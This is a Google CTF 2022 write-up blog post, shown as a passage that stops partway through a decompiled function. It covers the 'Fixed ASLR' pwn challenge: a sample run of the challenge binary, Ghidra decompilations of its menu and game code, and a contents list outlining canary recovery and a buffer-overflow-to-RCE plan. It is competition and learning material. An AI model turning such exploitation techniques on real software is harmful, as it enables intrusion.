<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <title>Google CTF 2022 - Chovid99&#39;s Blog</title><meta name="Description" content="Security&#39;s blog made by Chovid99"><meta property="og:title" content="Google CTF 2022" />
<meta property="og:description" content="Writeup for Google CTF 2022 by Chovid99" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://chovid99.github.io/posts/google-ctf-2022/" /><meta property="og:image" content="https://chovid99.github.io/C99-web-card.png"/><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-07-04T02:00:00+08:00" />
<meta property="article:modified_time" content="2023-02-23T18:03:33+07:00" /><meta property="og:site_name" content="Welcome to Chovid99&#39;s Blog" />

<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://chovid99.github.io/C99-web-card.png"/>

<meta name="twitter:title" content="Google CTF 2022"/>
<meta name="twitter:description" content="Writeup for Google CTF 2022 by Chovid99"/>
<meta name="application-name" content="Chovid99&#39;s Blog">
<meta name="apple-mobile-web-app-title" content="Chovid99&#39;s Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://chovid99.github.io/posts/google-ctf-2022/" /><link rel="prev" href="https://chovid99.github.io/posts/typhooncon-ctf-2022/" /><link rel="next" href="https://chovid99.github.io/posts/maplectf-2022/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "Google CTF 2022",
        "inLanguage": "en",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "https:\/\/chovid99.github.io\/posts\/google-ctf-2022\/"
        },"image": ["https:\/\/chovid99.github.io\/C99-web-card.png"],"genre": "posts","keywords": "Writeup, Google CTF, pwn, aslr, buffer overflow, rop, oob, prng, zip, forensic, 2022","wordcount":  9916 ,
        "url": "https:\/\/chovid99.github.io\/posts\/google-ctf-2022\/","datePublished": "2022-07-04T02:00:00+08:00","dateModified": "2023-02-23T18:03:33+07:00","publisher": {
            "@type": "Organization",
            "name": "Chovid99","logo": "https:\/\/chovid99.github.io\/C99-Black3.png"},"author": {
                "@type": "Person",
                "name": "Chovid99"
            },"description": ""
    }
    </script></head>
    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="Chovid99&#39;s Blog">Chovid99&#39;s Blog</a>
            <a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                
                
            </a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/" title="Check my Home"> Home </a><a class="menu-item" href="/posts/" title="Check my posts"> Posts </a><a class="menu-item" href="/tags/" title="Check my posts&#39; tags"> Tags </a><a class="menu-item" href="/about/" title="Know more about me"> About </a><span class="menu-item delimiter"></span></div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="Chovid99&#39;s Blog">Chovid99&#39;s Blog</a>
                <a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                </a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><a class="menu-item" href="/" title="Check my Home">Home</a><a class="menu-item" href="/posts/" title="Check my posts">Posts</a><a class="menu-item" href="/tags/" title="Check my posts&#39; tags">Tags</a><a class="menu-item" href="/about/" title="Know more about me">About</a></div>
    </div>
</header><main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">Contents</h2>
            <div class="toc-content" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Google CTF 2022</h1><div class="post-meta">
            <div class="post-meta-line">
                </div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="Jul 04, 2022">Jul 04, 2022</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;9916 words&nbsp;
                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;47 minutes&nbsp;</div>
        </div><div class="details toc" id="toc-static"  data-kept="">
                <div class="details-summary toc-title">
                    <span>Contents</span>
                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#pwn">Pwn</a>
      <ul>
        <li><a href="#fixed-aslr">Fixed ASLR</a>
          <ul>
            <li><a href="#initial-analysis">Initial Analysis</a>
              <ul>
                <li><a href="#decompilation-of-gameo">Decompilation of <code>game.o</code></a></li>
                <li><a href="#decompilation-of-loader">Decompilation of loader</a>
                  <ul>
                    <li><a href="#initialize-random-state">Initialize Random State</a></li>
                    <li><a href="#initialize-canary-stack-value">Initialize canary stack value</a></li>
                    <li><a href="#load-the-given-object-files-to-the-loader">Load the given object files to the loader</a></li>
                    <li><a href="#run-the-main-program">Run the main program</a></li>
                  </ul>
                </li>
              </ul>
            </li>
            <li><a href="#exploitation-plan">Exploitation Plan</a>
              <ul>
                <li><a href="#recover-rand-value">Recover rand() value</a></li>
                <li><a href="#recover-canary-value">Recover <code>canary</code> value</a></li>
                <li><a href="#leverage-the-bof-bug-to-perform-rce">Leverage the BOF bug to perform RCE</a></li>
              </ul>
            </li>
            <li><a href="#solution">Solution</a></li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#misc">Misc</a>
      <ul>
        <li><a href="#appnotetxt">Appnote.txt</a>
          <ul>
            <li><a href="#analysis--solution">Analysis &amp; Solution</a></li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#social-media">Social Media</a></li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://i.imgur.com/VybOsNj.jpg"
        data-srcset="https://i.imgur.com/VybOsNj.jpg, https://i.imgur.com/VybOsNj.jpg 1.5x, https://i.imgur.com/VybOsNj.jpg 2x"
        data-sizes="auto"
        alt="https://i.imgur.com/VybOsNj.jpg"
        title="https://i.imgur.com/VybOsNj.jpg" /></p>
<p>During this weekend, I played GoogleCTF with my team <code>idek</code>. I managed to solve two challenges, collaborating with my super teammates. We managed to get 20th place 😄</p>
<h1 id="pwn">Pwn</h1>
<h2 id="fixed-aslr">Fixed ASLR</h2>
<blockquote>
<p>I wasn&rsquo;t happy with the default ASLR, so I fixed it. The flag is in a file called &ldquo;flag&rdquo; both in / and cwd.</p>
</blockquote>
<p>I worked on this challenge together with my teammate <code>pivik</code>. Thanks a lot <code>pivik</code>!</p>
<h3 id="initial-analysis">Initial Analysis</h3>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://i.imgur.com/voaPMwJ.png"
        data-srcset="https://i.imgur.com/voaPMwJ.png, https://i.imgur.com/voaPMwJ.png 1.5x, https://i.imgur.com/voaPMwJ.png 2x"
        data-sizes="auto"
        alt="https://i.imgur.com/voaPMwJ.png"
        title="https://i.imgur.com/voaPMwJ.png" /></p>
<p>We were given a lot of files, where one of them is the main binary called <code>loader</code>, and the rest are object files.</p>
<p>Now, let&rsquo;s try to run the program first so that we can know how the program works.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span><span class="lnt">82
</span><span class="lnt">83
</span><span class="lnt">84
</span><span class="lnt">85
</span><span class="lnt">86
</span><span class="lnt">87
</span><span class="lnt">88
</span><span class="lnt">89
</span><span class="lnt">90
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"> ./loader
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   ______      Welcome to the
</span></span><span class="line"><span class="cl">  / ____/___ _____ ___  ___ 
</span></span><span class="line"><span class="cl"> / / __/ __ `/ __ `__ \/ _ \
</span></span><span class="line"><span class="cl">/ /_/ / /_/ / / / / / /  __/
</span></span><span class="line"><span class="cl">\____/\__,_/_/ /_/ /_/\___/ 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">-=*) MAIN MENU:
</span></span><span class="line"><span class="cl">  1) Play The Game
</span></span><span class="line"><span class="cl">  2) See full scoreboard
</span></span><span class="line"><span class="cl">  3) See score for place
</span></span><span class="line"><span class="cl">  4) Exit
</span></span><span class="line"><span class="cl">Your choice?
</span></span><span class="line"><span class="cl">1
</span></span><span class="line"><span class="cl">Have Fun, Good Luck!
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Round 1
</span></span><span class="line"><span class="cl">How much is 0 + 3 ?
</span></span><span class="line"><span class="cl">3
</span></span><span class="line"><span class="cl">Yes! +5pts! You have 5pts total.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl">[truncated]
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Round 11
</span></span><span class="line"><span class="cl">How much is 3 + 7 ?
</span></span><span class="line"><span class="cl">10
</span></span><span class="line"><span class="cl">Yes! +5pts! You have 55pts total.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Round 12
</span></span><span class="line"><span class="cl">How much is 2 + 9 ?
</span></span><span class="line"><span class="cl">0 
</span></span><span class="line"><span class="cl">Wrong! Game Over!
</span></span><span class="line"><span class="cl">Congratulations! You&#39;re going to the SCOREBOARD!
</span></span><span class="line"><span class="cl">How long is your name (0-31)?
</span></span><span class="line"><span class="cl">8       
</span></span><span class="line"><span class="cl">Now type in your name:
</span></span><span class="line"><span class="cl">Chovid99
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">-=*) MAIN MENU:
</span></span><span class="line"><span class="cl">  1) Play The Game
</span></span><span class="line"><span class="cl">  2) See full scoreboard
</span></span><span class="line"><span class="cl">  3) See score for place
</span></span><span class="line"><span class="cl">  4) Exit
</span></span><span class="line"><span class="cl">Your choice?
</span></span><span class="line"><span class="cl">Come again?
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">-=*) MAIN MENU:
</span></span><span class="line"><span class="cl">  1) Play The Game
</span></span><span class="line"><span class="cl">  2) See full scoreboard
</span></span><span class="line"><span class="cl">  3) See score for place
</span></span><span class="line"><span class="cl">  4) Exit
</span></span><span class="line"><span class="cl">Your choice?
</span></span><span class="line"><span class="cl">2
</span></span><span class="line"><span class="cl">-=*) SCOREBOARD:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  0. 95pts --- Gary
</span></span><span class="line"><span class="cl">  1. 90pts --- Yoel
</span></span><span class="line"><span class="cl">  2. 85pts --- Nicholas
</span></span><span class="line"><span class="cl">  3. 80pts --- Vanessa
</span></span><span class="line"><span class="cl">  4. 75pts --- Alice
</span></span><span class="line"><span class="cl">  5. 70pts --- Elizabeth
</span></span><span class="line"><span class="cl">  6. 65pts --- Linda
</span></span><span class="line"><span class="cl">  7. 60pts --- Peter
</span></span><span class="line"><span class="cl">  8. 55pts --- Wayne
</span></span><span class="line"><span class="cl">  9. 55pts --- Chovid99
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">-=*) MAIN MENU:
</span></span><span class="line"><span class="cl">  1) Play The Game
</span></span><span class="line"><span class="cl">  2) See full scoreboard
</span></span><span class="line"><span class="cl">  3) See score for place
</span></span><span class="line"><span class="cl">  4) Exit
</span></span><span class="line"><span class="cl">Your choice?
</span></span><span class="line"><span class="cl">3
</span></span><span class="line"><span class="cl">Which place&#39;s score do you want to see (0-9)?
</span></span><span class="line"><span class="cl">0
</span></span><span class="line"><span class="cl">To get this place you need to beat this score: 95
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">-=*) MAIN MENU:
</span></span><span class="line"><span class="cl">  1) Play The Game
</span></span><span class="line"><span class="cl">  2) See full scoreboard
</span></span><span class="line"><span class="cl">  3) See score for place
</span></span><span class="line"><span class="cl">  4) Exit
</span></span><span class="line"><span class="cl">Your choice?
</span></span><span class="line"><span class="cl">4
</span></span><span class="line"><span class="cl">Alright, bye
</span></span><span class="line"><span class="cl">WINNER: Gary
</span></span></code></pre></td></tr></table>
</div>
</div><p>Ah okay. Playing around with the binary gave us enough knowledge of how the binary works. We have 4 menus that we can interact:</p>
<ul>
<li>The first menu will start the math game
<ul>
<li>Each correct answer gave you <code>5 pts</code></li>
<li>If your score is high enough to be placed on the scoreboard, they will ask your name and then store it on the scoreboard</li>
</ul>
</li>
<li>The second menu will show the full scoreboard</li>
<li>The third menu will show the score value of the <code>scoreboard[input_idx]</code></li>
<li>The fourth menu will exit the game</li>
</ul>
<p>Now we&rsquo;ve got the idea of how the binary works, let&rsquo;s try analyzing all of the given files. I use <a href="https://github.com/NationalSecurityAgency/ghidra/releases" target="_blank" rel="noopener noreffer ">Ghidra</a> as my binary analyzer.</p>
<h4 id="decompilation-of-gameo">Decompilation of <code>game.o</code></h4>
<p>Looking around the given file, turn out that most of the above game methods are defined under <code>game.o</code> file. So, let&rsquo;s try to analyze the <code>game.o</code> file decompiled results to understand better.</p>
<p>We can start by checking the <code>menu</code> method, which checking the decompiled version is pretty similar to what we have interacted with before.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">undefined8</span> <span class="nf">menu</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">cVar1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">byte</span> <span class="n">bVar2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">undefined8</span> <span class="n">uVar3</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">in_FS_OFFSET</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">undefined</span> <span class="n">local_38</span> <span class="p">[</span><span class="mi">40</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">local_10</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">  <span class="n">local_10</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">puts</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">      <span class="s">&#34;</span><span class="se">\n</span><span class="s">-=*) MAIN MENU:</span><span class="se">\n</span><span class="s">  1) Play The Game</span><span class="se">\n</span><span class="s">  2) See full scoreboard</span><span class="se">\n</span><span class="s">  3) See score for place</span><span class="se">\n</span><span class="s">   4) Exit</span><span class="se">\n</span><span class="s">Your choice?&#34;</span>
</span></span><span class="line"><span class="cl">      <span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">cVar1</span> <span class="o">=</span> <span class="n">readline</span><span class="p">(</span><span class="n">local_38</span><span class="p">,</span><span class="mh">0x20</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">cVar1</span> <span class="o">==</span> <span class="sc">&#39;\x01&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">bVar2</span> <span class="o">=</span> <span class="n">atou64</span><span class="p">(</span><span class="n">local_38</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">bVar2</span> <span class="o">==</span> <span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Alright, bye&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="n">uVar3</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="n">bVar2</span> <span class="o">&lt;</span> <span class="mi">5</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">bVar2</span> <span class="o">==</span> <span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="n">see_scoreboard</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">          <span class="n">uVar3</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">          <span class="k">goto</span> <span class="n">LAB_00100829</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">bVar2</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="k">if</span> <span class="p">(</span><span class="n">bVar2</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">game</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">            <span class="n">uVar3</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">goto</span> <span class="n">LAB_00100829</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">          <span class="p">}</span>
</span></span><span class="line"><span class="cl">          <span class="k">if</span> <span class="p">(</span><span class="n">bVar2</span> <span class="o">==</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">see_full_scoreboard</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">            <span class="n">uVar3</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">goto</span> <span class="n">LAB_00100829</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">          <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Come again?&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="n">uVar3</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">uVar3</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nl">LAB_00100829</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">local_10</span> <span class="o">==</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">uVar3</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">                    <span class="cm">/* WARNING: Subroutine does not return */</span>
</span></span><span class="line"><span class="cl">  <span class="n">__stack_chk_fail</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>From this <code>menu</code> method, we can see that each menu that we chose before, they have its method to handle the menu.</p>
<p>Let&rsquo;s try to check the first main menu decompiled result, which is defined under <code>game</code> method.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">game</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">cVar1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">uint</span> <span class="n">uVar2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">cVar3</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">cVar4</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">in_FS_OFFSET</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">local_68</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">local_60</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">local_58</span> <span class="p">[</span><span class="mi">32</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">  <span class="n">undefined</span> <span class="n">local_38</span> <span class="p">[</span><span class="mi">40</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">local_10</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">  <span class="n">local_10</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Have Fun, Good Luck!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">local_68</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">local_60</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">do</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">print</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">Round &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">u64toa</span><span class="p">(</span><span class="n">local_58</span><span class="p">,</span><span class="n">local_60</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">puts</span><span class="p">(</span><span class="n">local_58</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">uVar2</span> <span class="o">=</span> <span class="n">rand</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="n">cVar3</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="n">uVar2</span> <span class="o">+</span> <span class="p">(</span><span class="kt">char</span><span class="p">)(</span><span class="n">uVar2</span> <span class="o">/</span> <span class="mi">10</span><span class="p">)</span> <span class="o">*</span> <span class="o">-</span><span class="mi">10</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">uVar2</span> <span class="o">=</span> <span class="n">rand</span><span class="p">();</span>
